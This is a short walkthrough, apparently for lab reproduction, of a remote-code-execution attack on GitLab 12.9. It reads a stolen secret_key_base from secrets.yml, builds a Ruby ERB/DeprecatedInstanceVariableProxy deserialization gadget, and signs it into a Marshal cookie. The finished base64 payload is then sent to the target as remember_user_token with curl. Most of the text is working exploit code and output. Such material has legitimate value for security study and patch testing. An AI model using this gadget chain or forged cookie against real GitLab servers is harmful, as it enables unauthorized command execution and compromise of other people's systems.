# From reading to execution

## How to reprodice execute part of this attack manually

1. Get docker image of Gitlab 12

       docker run -d --hostname=gitlab.hv -p 443:443 -p 80:80 -p 2222:22 --name=gitlab gitlab/gitlab-ce:12.9.0-ce.0

    This is our **target**.

2. Get a `secret_key_base` variable

    Thinking we could reproduce read part of the attack and got `secrets.yml` (just cut it, ok?):

       docker exec -it gitlab cat /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml
       ...
       secret_key_base: f498bc76a81ec3957296aaf9a9bf1e9d5ed61f3fd369397f30a671859fadca07bb2005a588313c50e32feb70466add4eb52b3600dec71290e59b40a7fd25b04c
       ...

3. Stop the target container.
4. Launch new gitlab container. This is our **working** gitlab container.
5. Set stolen `secret_key_base` to `secrets.yml`.
6. Get gitlab-rails console:

       /opt/gitlab/embedded/service/gitlab-rails/gitlab-rails console

    Try make a command

       irb(main):001:0> e = ERB.new("<%= `uname -a` %>")
       => #<ERB:0x00007ff4c606f1b8 @safe_level=nil, @src="#coding:UTF-8\n_erbout = +''; _erbout.<<(( `uname -a` ).to_s); _erbout", @encoding=#<Encoding:UTF-8>, @frozen_string=nil, @filename=nil, @lineno=0>
       irb(main):002:0> ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(e, :result, "@result", ActiveSupport::Deprecation.new)
       => "Linux gitlab.hv 5.11.11-arch1-1 #1 SMP PREEMPT Tue, 30 Mar 2021 14:10:17 +0000 x86_64 x86_64 x86_64 GNU/Linux\n"
       irb(main):003:0>

7. Creating a malicious cookie

    1. Set cookie serializer to marchall

           request = ActionDispatch::Request.new(Rails.application.env_config)
           request.env["action_dispatch.cookies_serializer"] = :marshal
           cookies = request.cookie_jar

    2. Creating a payload

           erb = ERB.new("<%= `echo Hello > /tmp/owned` %>")
           depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, "@result", ActiveSupport::Deprecation.new)
    
    3. Add the payload to cookie

           cookies.signed[:cookie] = depr
           puts cookies[:cookie]

    Got the resulting cookie:

        BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiWSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIEhlbGxvID4gL3RtcC9vd25lZGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--d5c06c0db17349cd18eb236ac97fcd507527ac4e

8. Stop workinf container and start the targt
9. Send out cookie to it

       curl http://gitlab.vh --cookie "remember_user_token=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiWSNjb2Rpbmc6VVRGLTgKX2VyYm91dCA9ICsnJzsgX2VyYm91dC48PCgoIGBlY2hvIEhlbGxvID4gL3RtcC9vd25lZGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--d5c06c0db17349cd18eb236ac97fcd507527ac4e"

